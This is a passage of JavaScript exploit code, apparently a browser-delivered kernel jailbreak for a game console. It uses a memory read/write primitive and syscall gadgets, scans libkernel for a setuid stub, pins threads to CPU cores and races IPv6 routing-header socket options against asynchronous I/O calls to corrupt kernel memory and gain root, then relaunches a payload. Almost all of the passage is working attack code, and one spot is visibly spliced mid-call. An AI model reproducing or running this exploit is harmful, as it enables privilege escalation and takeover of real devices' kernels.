              mark: mark, trace: trace, state: state, check: check,
              fetchFile: async function (path) {
                const response = await fetch(path);
                if (!response.ok) throw new Error(path + " HTTP " + response.status);
                return new Uint8Array(await response.arrayBuffer());
              },
              kbase: globalThis.__HX_KBASE,
            });
            allDone = true;
            finishUI(kvOk === true);
            return;
          } catch (kvError) {
            mark(
              "KV-THREW",
              (kvError && kvError.message ? kvError.message : String(kvError)) +
                " :: " +
                (kvError && kvError.stack ? String(kvError.stack).slice(0, 400) : "no-stack"),
            );
            allDone = true;
            return;
          }
        }
        const hxOk = await hx.runHx1400({
          p: p,
          sc: sc,
          callAddr: callAddr,
          bufAddr: bufAddr,
          errno: errno,
          webkitBase: webkitBase,
          libkernelBase: libkernelBase,
          G: G,
          stubAddr: stubAddr,
          int64: int64,
          params: params,
          keepAlive: keepAlive,
          mark: mark,
          trace: trace,
          state: state,
          check: check,
          fetchFile: async function (path) {
            const response = await fetch(path);

            if (!response.ok) {
              throw new Error(
                path + " HTTP " + response.status,
              );
            }

            return new Uint8Array(
              await response.arrayBuffer(),
            );
          },
        });

        allDone = true;
        finishUI(hxOk === true);
      } catch (hxError) {
        mark(
          "HX1400-THREW",
          hxError && hxError.message
            ? hxError.message
            : String(hxError),
        );

        allDone = true;
        finishUI(false);
      }

      return;
    }

const pid = sc(SYS.getpid).i32;
    check(
      "chain-reaches-kernel",
      pid > 0,
      "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
    );

    if (SKIPJB) {
      const SETUID = 23;
      if (!stubAddr.has(SETUID))
        for (let o = 0; o < off.k_scan_stage1; o += 16) {
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49)
            continue;
          if (
            ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 ===
            SETUID
          ) {
            stubAddr.set(SETUID, libkernelBase.add32(o));
            break;
          }
        }
      if (!stubAddr.has(SETUID)) {
        mark("JB-PROBE", "stub=absent skip=impossible");
      } else {
        const suRv = sc(SETUID, 0).i32;
        const uidNow = sc(SYS.getuid).i32;
        mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
        if (suRv === 0 && uidNow === 0) {
          jailbroken = true;
          mark(
            "JB-ALREADY",
            "kernel already patched -- 663 race skipped, pid=" + pid,
          );
          if (DO_PAYLOAD) await relaunchPayload();
          mark(
            "EG-VERDICT",
            "fw=" +
              fwKey +
              " jailbroken=1 kpatched=already payload_running=" +
              (payloadRunning ? 1 : 0) +
              " armings=0 reused=1",
          );
          allDone = true;
          return;
        }
      }
    }

    const scratchAb = new ArrayBuffer(0x1000);
    keepAlive.push(scratchAb);
    const scratch = bufAddr(scratchAb);
    const argAb = new ArrayBuffer(8);
    keepAlive.push(argAb);
    const argAddr = bufAddr(argAb),
      argDv = new DataView(argAb);
    const lenAb = new ArrayBuffer(8);
    keepAlive.push(lenAb);
    const lenAddr = bufAddr(lenAb),
      lenDv = new DataView(lenAb);

    function makeRpc(wk, name) {
      let seq = 0;
      const pending = new Map();
      wk.onmessage = function (e) {
        const d = e.data || {};
        const slot = pending.get(d.id);
        if (!slot) return;
        pending.delete(d.id);
        if (slot.timer) clearTimeout(slot.timer);
        if (d.type === "err") slot.reject(new Error(String(d.value)));
        else slot.resolve(d.value);
      };
      wk.onerror = (e) =>
        mark(
          "WORKER-ONERROR",
          name + " " + (e && e.message ? e.message : String(e)),
        );
      return function call(fname, timeoutMs, ...args) {
        return new Promise(function (resolve, reject) {
          const id = seq++;
          const timer =
            timeoutMs > 0
              ? setTimeout(function () {
                  pending.delete(id);
                  reject(new Error(name + ": timeout waiting for " + fname));
                }, timeoutMs)
              : null;
          pending.set(id, { resolve, reject, timer });
          wk.postMessage({ id: id, name: fname, args: args });
        });
      };
    }
    function ptrish(v) {
      return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0;
    }

    const IPPROTO_IPV6 = 41,
      IPV6_RTHDR = 51;
    const AF_INET6 = 28,
      SOCK_DGRAM = 2,
      AF_UNIX = 1,
      SOCK_STREAM = 1;
    const numArg = parseInt(params.get("num") || "", 10);
    const NUM = Number.isFinite(numArg) && numArg >= 2 && numArg <= 128 ? numArg : 9;
    const RTH_N = NUM > 2 ? 16 : 4;
    const RTH_SIZE = 16 * RTH_N + 8,
      RTH_LEN = 2 * RTH_N,
      RTH_SEGLEFT = RTH_N;
    const SCRATCH_PAGE = (RTH_N << 24) >>> 0,
      NODE0_DEC = ((RTH_N << 24) | (RTH_LEN << 8)) >>> 0;
    const SYS_MMAP = 477;
    const PROT_RW = 3,
      MAP_PRIVATE = 2,
      MAP_FIXED = 0x10,
      MAP_ANON = 0x1000;
    const NODE_SZ = 0x38;
    const N_LEAK = params.get("n") ? parseInt(params.get("n"), 10) : 262144;
    const SPRAY = params.get("spray") ? parseInt(params.get("spray"), 10) : 512;
    const SPIN = params.get("spin")
      ? parseInt(params.get("spin"), 10)
      : 40000000;
    const CUT = params.get("cut") !== "0";
    const CUT_MARGIN = params.get("cutmargin")
      ? parseInt(params.get("cutmargin"), 10)
      : 8192;
    mark(
      "PR-CFG",
      "nleak=" +
        N_LEAK +
        " spray=" +
        SPRAY +
        " spin=" +
        SPIN +
        " cut=" +
        (CUT ? CUT_MARGIN : 0),
    );

    async function bringWorker(name) {
      const w = { name: name, armed: false, wired: false };
      w.worker = new Worker("rpc_worker.js");
      w.rpc = makeRpc(w.worker, name);
      if ((await w.rpc("ping", 15000)) !== "pong")
        throw new Error(name + " ping");
      const sLo = 0x10100000,
        sHi = 0xc0de0000;
      const arr = await w.rpc("init", 15000, sLo, sHi);
      keepAlive.push(arr);
      const D = bufAddr(arr.buffer);
      if (p.read4(D) >>> 0 !== sLo) throw new Error(name + " transfer");
      const storage = p.read8(D.add32(0x10));
      const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
      if (!mc || !ptrish(mc)) throw new Error(name + " walk");
      const bf = p.read8(mc.add32(8));
      let wm = null,
        wv = null,
        wl = null;
      for (let k = 1; k <= 8; ++k) {
        const val = p.read8(bf.sub32(8 * k));
        if (!ptrish(val)) continue;
        const inl = p.read8(val.add32(0x10));
        const len = p.read4(val.add32(0x18)) >>> 0;
        if (inl.hi === 0 && inl.low === 2) {
          if (!wl) wl = val;
        } else if (inl.hi > 0 && len === 6) {
          if (!wm) wm = val;
        } else if (inl.hi > 0 && len === 0x30) {
          if (!wv) wv = val;
        }
      }
      if (!(wm && wv && wl)) throw new Error(name + " shapes");
      w.master = wm;
      w.origVector = p.read8(wm.add32(0x10));
      p.write8(wm.add32(0x10), wv);
      w.wired = true;
      await w.rpc("setup", 15000, wl.low, wl.hi);
      await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
      w.armed = true;
      w.ctx = makeCtx();
      w.fire = function (num, args, ms) {
        layout(w.ctx, stubAddr.get(num), args);
        return w.rpc(
          "fire",
          ms === undefined ? 20000 : ms,
          w.ctx.S.low,
          w.ctx.S.hi,
        );
      };
      return w;
    }
    const w1 = await bringWorker("w1");
    const w2 = await bringWorker("w2");
    await w1.fire(SYS.getpid, []);
    const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
    await w2.fire(SYS.getpid, []);
    const w2pid = w2.ctx.frameDv.getUint32(0, true) | 0;
    check(
      "pr-two-workers-reach-kernel",
      w1pid > 0 && w2pid > 0,
      "w1 getpid=" +
        w1pid +
        " w2 getpid=" +
        w2pid +
        " main=" +
        sc(SYS.getpid).i32,
    );

    const zoneOf = (s) => {
      const r = s & 15 ? (s + 16) & ~15 : s;
      let z = 16;
      while (z < r) z <<= 1;
      return z;
    };
    const geomOk =
      RTH_SIZE === 8 * (RTH_LEN + 1) &&
      (RTH_LEN & 1) === 0 &&
      RTH_LEN !== 0 &&
      RTH_SEGLEFT === RTH_LEN / 2 &&
      NODE0_DEC === (((RTH_SEGLEFT << 24) | (RTH_LEN << 8)) >>> 0) &&
      NODE0_DEC >= SCRATCH_PAGE &&
      NODE0_DEC < SCRATCH_PAGE + 0x10000 - 4 &&
      !(NODE0_DEC >= SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) &&
        NODE0_DEC < SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000) + RTH_SIZE) &&
      zoneOf(NUM * 0x38) === zoneOf(RTH_SIZE);
    if (
      !check(
        "pr-geometry-consistent",
        geomOk,
        "num=" +
          NUM +
          " victim=0x" +
          (NUM * 0x38).toString(16) +
          " rth=0x" +
          RTH_SIZE.toString(16) +
          " len=" +
          RTH_LEN +
          " segleft=" +
          RTH_SEGLEFT +
          " zone=" +
          zoneOf(NUM * 0x38) +
          "/" +
          zoneOf(RTH_SIZE) +
          " scratch=0x" +
          SCRATCH_PAGE.toString(16) +
          " node0_dec=0x" +
          NODE0_DEC.toString(16),
      )
    )
      return;

    const mr = sc(
      SYS_MMAP,
      SCRATCH_PAGE,
      0x10000,
      PROT_RW,
      MAP_FIXED | MAP_ANON | MAP_PRIVATE,
      -1,
      0,
    );
    const mgot = new int64(mr.lo, mr.hi);
    if (
      !check(
        "pr-scratch-page-mapped",
        mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
        "got=0x" + (mgot.low >>> 0).toString(16),
      )
    )
      return;
    const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (vs < 0) {
      mark("PR-ABORT", "verify socket");
      return;
    }
    opened.push(vs);
    {
      const tAb = new ArrayBuffer(RTH_SIZE);
      keepAlive.push(tAb);
      const tDv = new DataView(tAb);
      tDv.setUint8(1, RTH_LEN);
      tDv.setUint8(3, RTH_SEGLEFT);
      sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
      const RT = SCRATCH_PAGE + (NUM > 2 ? 0x8000 : 0x2000);
      lenDv.setUint32(0, RTH_SIZE, true);
      lenDv.setUint32(4, 0, true);
      const g1 = sc(
        SYS.getsockopt,
        vs,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        RT,
        lenAddr,
      ).i32;
      const s2 = sc(
        SYS.setsockopt,
        vs,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        RT,
        lenDv.getUint32(0, true),
      ).i32;
      if (
        !check(
          "pr-scratch-page-kernel-rw",
          g1 === 0 && s2 === 0,
          "copyout=" + g1 + " copyin=" + s2,
        )
      )
        return;
    }

    const mAb = new ArrayBuffer(0xc0);
    keepAlive.push(mAb);
    const mU32 = new Uint32Array(mAb);
    keepAlive.push(mU32);
    const mU8 = new Uint8Array(mAb);
    keepAlive.push(mU8);
    const M_AD = bufAddr(mAb);
    mU32.fill(0);
    mU32[6] = 4;
    const OWNER_LO = 6,
      OWNER_HI = 7;
    const lkAb = new ArrayBuffer(0x40);
    keepAlive.push(lkAb);
    const lkDv = new DataView(lkAb),
      lkAd = bufAddr(lkAb);
    const LX = lkAd.add32(0x00),
      LC = lkAd.add32(0x10);

    const NBLOCK = 8;
    const bspAb = new ArrayBuffer(8);
    keepAlive.push(bspAb);
    const bspDv = new DataView(bspAb);
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) {
      mark("PR-ABORT", "block socketpair");
      return;
    }
    const bsp0 = bspDv.getInt32(0, true),
      bsp1 = bspDv.getInt32(4, true);
    opened.push(bsp0, bsp1);
    const brbAb = new ArrayBuffer(0x40);
    keepAlive.push(brbAb);
    const brqAb = new ArrayBuffer(NBLOCK * 0x28);
    keepAlive.push(brqAb);
    const brqDv = new DataView(brqAb);
    for (let k = 0; k < NBLOCK; k++) {
      const b = k * 0x28;
      put(brqDv, b + 0x08, 0x40);
      put(brqDv, b + 0x10, bufAddr(brbAb));
      brqDv.setInt32(b + 0x20, bsp0, true);
    }
    const bidAb = new ArrayBuffer(NBLOCK * 4);
    keepAlive.push(bidAb);

    const CPU_LEVEL_WHICH = 3,
      CPU_WHICH_TID = 1,
      CPUSET_SZ = 0x10;
    const ID64 = new int64(0xffffffff, 0xffffffff);
    const mskAb = new ArrayBuffer(CPUSET_SZ);
    keepAlive.push(mskAb);
    const mskDv = new DataView(mskAb),
      mskAd = bufAddr(mskAb);
    new Uint8Array(mskAb).fill(0);
    const affGot = sc(
      SYS.cpuset_getaffinity,
      CPU_LEVEL_WHICH,
      CPU_WHICH_TID,
      ID64,
      CPUSET_SZ,
      mskAd,
    ).i32;
    const savedMask = mskDv.getUint32(0, true) >>> 0;
    const cores = [];
    for (let i = 0; i < 32; i++) if (savedMask & (1 << i)) cores.push(i);
    mark(
      "PIN-AVAIL",
      "rv=" +
        affGot +
        " mask=0x" +
        savedMask.toString(16) +
        " cores=" +
        cores.join(","),
    );
    if (
      !check(
        "pin-read-mask",
        affGot === 0 && cores.length > 0,
        "rv=" + affGot + " cores=" + cores.length,
      )
    )
      return;
    const coreArg = params.get("core")
      ? parseInt(params.get("core"), 10)
      : -1;
    const candidates = coreArg >= 0 ? [coreArg] : cores.slice();
    let PINCORE = -1,
      affSet = -1,
      backMask = 0;
    for (const c of candidates) {
      new Uint8Array(mskAb).fill(0);
      mskDv.setUint32(0, (1 << c) >>> 0, true);
      affSet = sc(
        SYS.cpuset_setaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd,
      ).i32;
      new Uint8Array(mskAb).fill(0);
      sc(
        SYS.cpuset_getaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd,
      );
      backMask = mskDv.getUint32(0, true) >>> 0;
      if (affSet === 0 && backMask === (1 << c) >>> 0) {
        PINCORE = c;
        break;
      }
      mark(
        "PIN-REJECT",
        "core=" + c + " rv=" + affSet + " back=0x" + backMask.toString(16),
      );
    }
    mark(
      "PIN-SET",
      "core=" +
        PINCORE +
        " rv=" +
        affSet +
        " reads back 0x" +
        backMask.toString(16) +
        " tried=" +
        candidates.join(","),
    );
    if (PINCORE < 0 && retryBenign("pin-failed")) return;
    if (
      !check(
        "MAIN-PINNED",
        PINCORE >= 0,
        "core=" +
          PINCORE +
          " mask=0x" +
          backMask.toString(16) +
          " (free and malloc in armOnce now share one UMA per-cpu bucket)",
      )
    )
      return;

    const otherCores = cores.filter((c) => c !== PINCORE);
    const msk2Ab = new ArrayBuffer(CPUSET_SZ);
    keepAlive.push(msk2Ab);
    const msk2Dv = new DataView(msk2Ab),
      msk2Ad = bufAddr(msk2Ab);
    const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
    async function pinWorker(w, c) {
      new Uint8Array(msk2Ab).fill(0);
      msk2Dv.setUint32(0, (1 << c) >>> 0, true);
      await w.fire(SYS.cpuset_setaffinity, aw);
      const rv = w.ctx.frameDv.getUint32(0, true) | 0;
      new Uint8Array(msk2Ab).fill(0);
      await w.fire(SYS.cpuset_getaffinity, aw);
      const back = msk2Dv.getUint32(0, true) >>> 0;
      return { rv: rv, back: back, ok: rv === 0 && back === (1 << c) >>> 0 };
    }
    let OTHER = -1,
      wpin = "none";
    for (let i = otherCores.length - 1; i >= 0; i--) {
      const c = otherCores[i];
      const p1 = await pinWorker(w1, c);
      if (!p1.ok) {
        mark(
          "PIN-WREJECT",
          "core=" + c + " w1=" + p1.rv + " back=0x" + p1.back.toString(16),
        );
        continue;
      }
      const p2 = await pinWorker(w2, c);
      if (!p2.ok) {
        mark(
          "PIN-WREJECT",
          "core=" + c + " w2=" + p2.rv + " back=0x" + p2.back.toString(16),
        );
        continue;
      }
      OTHER = c;
      wpin = "w1=" + p1.rv + " w2=" + p2.rv + " back=0x" + p2.back.toString(16);
      break;
    }
    mark(
      "PIN-WSET",
      "core=" + OTHER + " " + wpin + " tried=" + otherCores.join(","),
    );
    if (
      !check(
        "WORKERS-PINNED",
        OTHER >= 0,
        "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin,
      )
    ) {
      mark(
        "PIN-REFUSE",
        "no worker core verifies apart from main=" +
          PINCORE +
          "; sharing it is the configuration that hangs",
      );
      return;
    }
    mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);

    pinRestore = function () {
      const permitted = (((1 << PINCORE) | (1 << OTHER)) >>> 0) || savedMask;
      function apply(m) {
        new Uint8Array(mskAb).fill(0);
        mskDv.setUint32(0, m, true);
        return sc(
          SYS.cpuset_setaffinity,
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          ID64,
          CPUSET_SZ,
          mskAd,
        ).i32;
      }
      let used = savedMask,
        r = apply(savedMask);
      if (r !== 0 && permitted !== savedMask) {
        used = permitted;
        r = apply(permitted);
      }
      mark(
        "PIN-RESTORED",
        "rv=" +
          r +
          " mask=0x" +
          used.toString(16) +
          " saved=0x" +
          savedMask.toString(16),
      );
    };

    mark(
      "PR-SATURATE",
      "rv=" +
        sc(
          SYS.aio_submit_cmd,
          1 | 0x1000,
          bufAddr(brqAb),
          NBLOCK,
          3,
          bufAddr(bidAb),
               sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE).i32 ===
        0
      )
        renew++;
    mark(
      "PR-NEUTRALISE",
      "next=0 on " +
        renew +
        "/" +
        POOL.length +
        "  armings_left_dangling=" +
        armCount +
        "  (workers deliberately NOT terminated: their td_proc is corrupt" +
        " and terminate() would make them syscall)",
    );

    const drWbAb = new ArrayBuffer(NBLOCK * 0x40);
    keepAlive.push(drWbAb);
    const drStAb = new ArrayBuffer(NBLOCK * 4);
    keepAlive.push(drStAb);
    const drStDv = new DataView(drStAb);
    const drStAd = bufAddr(drStAb);
    const drBidAd = bufAddr(bidAb);

    let drGate = true;
    let drGateSt = "";
    const drGatePoll = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
    for (let k = 0; k < NUM; k++) {
      const st = stDv2.getUint32(k * 4, true) >>> 0;
      drGateSt += (k ? "," : "") + st.toString(16);
      if ((st & 0xffff) < 3 && (st & 0x80000000) === 0) drGate = false;
    }
    mark(
      "PR-GATE",
      "poll=" +
        drGatePoll +
        " ok=" +
        (drGate ? 1 : 0) +
        " st=[" +
        drGateSt +
        "] rule=every_race_id_terminal_or_gone",
    );

    if (!drGate) {
      mark(
        "PR-DRAIN-SKIPPED",
        "a race request is still live -- workers NOT released",
      );
    } else {
      const drWr = sc(SYS.write, bsp1, bufAddr(drWbAb), NBLOCK * 0x40).i32;
      let drSpins = 0;
      let drDone = 0;
      for (; drSpins < 200; drSpins++) {
        sc(SYS.aio_multi_poll, drBidAd, NBLOCK, drStAd);
        drDone = 0;
        for (let k = 0; k < NBLOCK; k++)
          if ((drStDv.getUint32(k * 4, true) & 0xffff) >= 3) drDone++;
        if (drDone === NBLOCK) break;
      }
      let drSt = "";
      for (let k = 0; k < NBLOCK; k++)
        drSt +=
          (k ? "," : "") + (drStDv.getUint32(k * 4, true) >>> 0).toString(16);
      const drDel = sc(SYS.aio_multi_delete, drBidAd, NBLOCK, drStAd).i32;
      mark(
        "PR-DRAIN",
        "wr=" +
          drWr +
          " done=" +
          drDone +
          "/" +
          NBLOCK +
          " spins=" +
          drSpins +
          " st=[" +
          drSt +
          "] del=" +
          drDel,
      );
    }
  } catch (e) {
    mark("THREW", e && e.message ? e.message : String(e));
    state("threw", "bad");
    try { await adviseRestart("exploit threw"); } catch (eR) {}
  } finally {
    try {
      if (jbRestoreHook) jbRestoreHook("finally");
    } catch (e5) {
      mark("JB-RESTORE-THREW", (e5 && e5.message) || String(e5));
    }
    try {
      if (opened.length && closeFd && mainArmed) {
        let n = 0;
        for (const fd of opened) if (closeFd(fd) === 0) n++;
        mark("STRAGGLERS-CLOSED", n + "/" + opened.length);
      }
    } catch (e3) {
      mark("CLOSE-THREW", (e3 && e3.message) || String(e3));
    }
    try {
      if (pinRestore) pinRestore();
    } catch (e4) {
      mark("PIN-RESTORE-THREW", (e4 && e4.message) || String(e4));
    }
    try {
      if (mainArmed && mainMf && mainOrig && p) {
        p.write8(mainMf, mainOrig);
        mainArmed = false;
        mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
      }
    } catch (e2) {
      mark("DISARM-THREW", (e2 && e2.message) || String(e2));
    }

    try {
      if (typeof A !== "undefined" && A) A.busy = 0;
    } catch (e) {}
    try {
      if (!payloadRunning && !jailbroken && (failCount > 0 || !allDone)) {
        await adviseRestart("run incomplete pass=" + passCount + " fail=" + failCount);
      }
    } catch (eA) {}
    mark(
      "PROOF-SUMMARY-FINAL",
      "pass=" +
        passCount +
        " fail=" +
        failCount +
        (allDone ? "" : "  INCOMPLETE"),
    );
    try {
      finishUI(payloadRunning);
    } catch (eUI) {}
  }
})();
